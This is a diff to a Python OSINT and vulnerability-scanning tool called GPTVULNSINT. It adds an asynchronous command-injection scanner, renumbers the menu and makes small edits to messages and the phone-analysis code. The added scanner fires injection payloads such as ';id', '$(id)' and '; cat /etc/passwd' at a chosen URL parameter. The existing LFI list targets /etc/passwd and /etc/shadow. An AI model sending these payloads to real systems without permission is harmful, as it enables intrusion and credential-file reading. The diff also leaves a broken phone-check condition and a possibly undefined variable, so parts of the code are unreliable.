@@ -16,6 +16,7 @@ from reportlab.lib.pagesizes import A4
 import os, platform, webbrowser, shutil, subprocess
 from phonenumbers import geocoder, carrier
 import phonenumbers
+import requests
 
 init(autoreset=True)
 logging.basicConfig(
@@ -408,16 +409,16 @@ class GPTVULNSINT:
                 "EMAIL": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
             }
             
-            print(Fore.YELLOW + "[+] Fetching main page...")
+            print(Fore.YELLOW + "Fetching main page...")
             async with aiohttp.ClientSession() as session:
              async with session.get(target_url, timeout=15) as response:
                     if response.status != 200:
-                        print(Fore.RED + f"[-] HTTP Error: {response.status}")
+                        print(Fore.RED + f"HTTP Error: {response.status}")
                         return
                     
                     html_content = await response.text()
             
-            print(Fore.YELLOW + "[+] Parsing for JavaScript files...")
+            print(Fore.YELLOW + "Parsing for JavaScript files...")
             soup = BeautifulSoup(html_content, 'html.parser')
             
             text_content = soup.get_text()
@@ -481,7 +482,7 @@ class GPTVULNSINT:
                     continue
             
             print(Fore.GREEN + "\n" + "="*60)
-            print(Fore.YELLOW + "🔐 Scan results:")
+            print(Fore.YELLOW + "Scan results:")
             print(Fore.GREEN + "="*60)
             
             total_found = sum(len(v) for v in results.values())
@@ -520,11 +521,11 @@ class GPTVULNSINT:
                 await asyncio.to_thread(self._quick_save_results, target_url, results)
                 
         except asyncio.TimeoutError:
-            print(Fore.RED + "[-] Scan timeout: Operation took too long")
+            print(Fore.RED + "Scan timeout: Operation took too long")
         except aiohttp.ClientError as e:
-            print(Fore.RED + f"[-] Network error: {e}")
+            print(Fore.RED + f"Network error: {e}")
         except Exception as e:
-            print(Fore.RED + f"[-] Scan error: {str(e)[:100]}")
+            print(Fore.RED + f"Scan error: {str(e)[:100]}")
             logging.error(f"Sensitive data scan error: {e}")
     
     async def sensitive_data_scan(self):
@@ -711,7 +712,7 @@ class GPTVULNSINT:
 
     async def phone_analyzer(self):
         try:
-            number = input(Fore.CYAN + "Enter number (example +254...): ").strip()
+            number = input(Fore.CYAN + "Enter number (example +1...): ").strip()
             if not number:
                 return
 
@@ -727,14 +728,14 @@ class GPTVULNSINT:
             print(Fore.GREEN + f"\nCountry/Region: {region}")
             print(Fore.GREEN + f"Operator: {operator}")
 
-            if number.startswith("+") and "Safaricom" not in operator:
+            if number.startswith("+") and "" not in operator:
                 number = ' ' + number 
-                print(Fore.RED + "ATTENTION: Number no belongs Safaricom (M-Pesa)!")
+                print(Fore.RED + "ATTENTION: Number no belongs!")
 
             self.scan_results.append(f"Phone Analysis: {number} ({region}, {operator})")
 
             search_url = f"https://www.google.com/search?q=\"{number}\" + (scam OR fraud OR wash-wash)"
-            safe_open_url(search_url, "M-Pesa Fraud Search")
+            safe_open_url(search_url, "Fraud Search")
 
         except Exception as e:
             print(Fore.RED + f"Error analyze number: {e}")
@@ -852,7 +853,7 @@ class GPTVULNSINT:
             logging.error(f"Clear results error: {e}")
 
 class LFI_Scanner:
-    def init(self):
+    def __init__(self):
         self.payloads = [
             '../../../../../../../../../../etc/passwd',
             '../../../../../../../../../../etc/shadow',
@@ -1060,6 +1061,51 @@ class LFI_Scanner:
             print("✅ Scan completed!")
             print("="*60)
 
+class AsyncRCEScanner:
+ def __init__(self):
+
+      self.payloads = [
+      ";id", "|id", "&id", "`id`", "$(id)", 
+      "; cat /etc/passwd", "|| id", "'; id", "\"; id",
+      "| whoami", "; ls -la"
+    ]
+      self.signatures = [
+      "uid=", "gid=", "root:x:0:0", "www-data", 
+      "groups=", "bin/bash", "total "
+    ]
+
+ async def _test_payload(self, session, url, param, payload):
+  encoded_pay = quote(payload)
+  target_url = f"{url}?{param}={encoded_pay}"
+
+  try:
+    async with session.get(target_url, timeout=5, ssl=False) as response:
+     text = await response.text()
+    for sig in self.signatures:
+     if sig in text:
+       return True, payload, target_url, sig
+  except Exception:
+    pass
+  return False, None, None, None
+
+ async def scan(self, url, param):
+    print(Fore.YELLOW + f"\nStarting Async RCE Scan: {url}")
+
+    async with aiohttp.ClientSession(headers={'User-Agent': 'Mozilla/5.0'}) as session:
+     tasks = [self._test_payload(session, url, param, pay) for pay in self.payloads]
+     results = await asyncio.gather(*tasks)
+
+     found = False
+    for res in results:
+      if res and res[0]:
+       is_vuln, pay, t_url, sig = res
+       print(Fore.RED + f"\n[!!!] RCE DETECTED! | Payload: {pay} | Sig: {sig}")
+       found = True
+       break
+
+    if not found:
+      print(Fore.GREEN + f"\nNo RCE vulnerabilities found for parameter '{param}'.")
+
 def print_menu():
     os.system('cls' if os.name == 'nt' else 'clear')
     print_banner()
@@ -1082,37 +1128,38 @@ def print_menu():
             ("11", "WordPress Scanner"),
             ("12", "Phind AI Search"),
             ("13", "Sensitive Data Scan"),
-            ("14", "LFI Vulnerability Scanner")
+            ("14", "LFI Vulnerability Scanner"),
+            ("15", "RCE Scanner")
         ]),
         
         ("MALWARE ANALYSIS", [
-            ("15", "Kaspersky TI"),
-            ("16", "MetaDefender"),
-            ("17", "MalwareBazaar"),
-            ("18", "VirusTotal")
+            ("16", "Kaspersky TI"),
+            ("17", "MetaDefender"),
+            ("18", "MalwareBazaar"),
+            ("19", "VirusTotal")
         ]),
         
         ("EMAIL OSINT", [
-            ("19", "Epieos"),
-            ("20", "Email Parser")
+            ("20", "Epieos"),
+            ("21", "Email Parser")
         ]),
         
         ("THREAT INTELLIGENCE", [
-            ("21", "SecureList (Kaspersky)"),
-            ("22", "MITRE ATT&CK"),
-            ("23", "MISP Platform")
+            ("22", "SecureList (Kaspersky)"),
+            ("23", "MITRE ATT&CK"),
+            ("24", "MISP Platform")
         ]),
         ("MOBILE & GEO", [
-            ("24", "Cell Tower Info"),
-            ("25", "USGS Earth Explorer"),
-            ("26", "Information phone number")
+            ("25", "Cell Tower Info"),
+            ("26", "USGS Earth Explorer"),
+            ("27", "Information phone number")
         ]),
         
         ("UTILITIES", [
-            ("27", "Google Search"),
-            ("28", "Generate PDF Report"),
-            ("29", "Show Statistics"),
-            ("30", "Clear Results"),
+            ("28", "Google Search"),
+            ("29", "Generate PDF Report"),
+            ("30", "Show Statistics"),
+            ("31", "Clear Results"),
             ("0", "Exit")
         ])
     ]
@@ -1129,7 +1176,7 @@ async def main():
     async with GPTVULNSINT() as tool:
         while True:
             print_menu()
-            choice = input(Fore.CYAN + "\nSelect option (0-29): ").strip()
+            choice = input(Fore.CYAN + "\nSelect option (0-31): ").strip()
             
             if choice == "0":
                 print(Fore.YELLOW + "\nExiting GPTVULNSINT...")
@@ -1164,36 +1211,42 @@ async def main():
             elif choice == "14":
                 await tool.lfi_scanner()
             elif choice == "15":
-                await tool.kaspersky()
+                url = input(Fore.CYAN + "Enter URL (with http/https): ").strip()
+                param = input(Fore.CYAN + "Enter Parameter (example: 'id'): ").strip()
+                if url and param:
+                  scanner = AsyncRCEScanner()
+                await scanner.scan(url, param)
             elif choice == "16":
-                await tool.metadefender()
+                await tool.kaspersky()
             elif choice == "17":
-                await tool.malwarebazaar()
+                await tool.metadefender()
             elif choice == "18":
-                await tool.virustotal()
+                await tool.malwarebazaar()
             elif choice == "19":
-                await tool.epieos()
+                await tool.virustotal()
             elif choice == "20":
-                await tool.email_parse()
+                await tool.epieos()
             elif choice == "21":
-                await tool.securelist()
+                await tool.email_parse()
             elif choice == "22":
-                await tool.mitre()
+                await tool.securelist()
             elif choice == "23":
-                await tool.misp()
+                await tool.mitre()
             elif choice == "24":
-                await tool.usgs()
+                await tool.misp()
             elif choice == "25":
-                await tool.cell_id()
+                await tool.usgs()
             elif choice == "26":
-                await tool.phone_analyzer()
+                await tool.cell_id()
             elif choice == "27":
-                await tool.google_search()
+                await tool.phone_analyzer()
             elif choice == "28":
-                await tool.generate_pdf()
+                await tool.google_search()
             elif choice == "29":
-                await tool.show_stats()
+                await tool.generate_pdf()
             elif choice == "30":
+                await tool.show_stats()
+            elif choice == "31":
                 await tool.clear_results()
             else:
                 print(Fore.RED + "Invalid option")
